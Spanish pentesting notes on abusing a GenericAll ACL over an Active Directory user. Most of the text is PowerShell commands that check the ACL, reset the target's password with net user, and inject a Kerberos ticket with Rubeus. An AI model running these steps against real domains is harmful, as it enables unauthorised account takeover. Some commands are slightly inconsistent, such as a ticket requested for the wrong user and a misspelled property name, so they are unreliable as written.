# Abuso ACL 

Tags: #AD #ACL #Windows 

## GenericAll sobre Usuario

Si tenemos esta ACL sobre un Usuario, proporciona control total sobre el objeto usuario. En este escenario podemos aprovecharlo para cambiar la contraseña de userwrite.user y posteriormente autenticarnos como ese usuario.

```powershell
❯ import-module .\Microsoft.ActiveDirectory.Management.dll

# Paso 1: Identificar el usuario que controlamos
❯ Get-ADUser -Identity "userall.user"

# Paso 2: Obtener el SID del usuario que posee GenericAll
❯ $user = Get-ADUser -Identity "userall.user"

# Paso 3: Obtener el SID
❯ $SID = $user.SID

# Paso 4: Comprobar que userall.user tiene GenericAll sobre userwrite.user
❯ Get-ObjectAcl -SamAccountName userwrite.user -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll" -and $_.SecurityIdentifier -eq $SID} | Select AceType,ActiveDirectoryRights,ObjectDN | Format-List

# Paso 5: Cambiar la contraseña del usuario objetivo aprovechando GenericAll
❯ net user userwrite.user P4ssw0rd /domain

# Objetivo:
# userall.user → GenericAll → userwrite.user → cambiar contraseña → autenticarse como userwrite.user

# Inyectar un TGT 
❯ .\Rubeus.exe asktgt /user:userall.user /password:Password@1 /ptt
❯ klist
❯ klist purge
```

## Otra forma de hacerlo 
```powershell 
❯ Get-ObjectAcl -SamAccountName userwrite.user -ResolveGUIDs | %{$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.Security-Identifier);$_} | ?{$_.IdentityName -match 'userall.user'} | select AceType,IdentityName,ActiveDirectoryRights,ObjectDN | fl 

❯ ./Rubeus.exe asktgt /user:userall.user /password:Password@1 /ptt  # Solicitamos el TGT con la password haciendo Pass-The-Ticket

❯ klist         # Mirar todos los tickets que se encuentran para los diferentes servicios 
❯ klist purge   # Eliminar los tickets que estan en cache

❯ net user userwrite.user P4ssw0rd /domain    # Cambiar la password al usuario 'userwrite.user'
```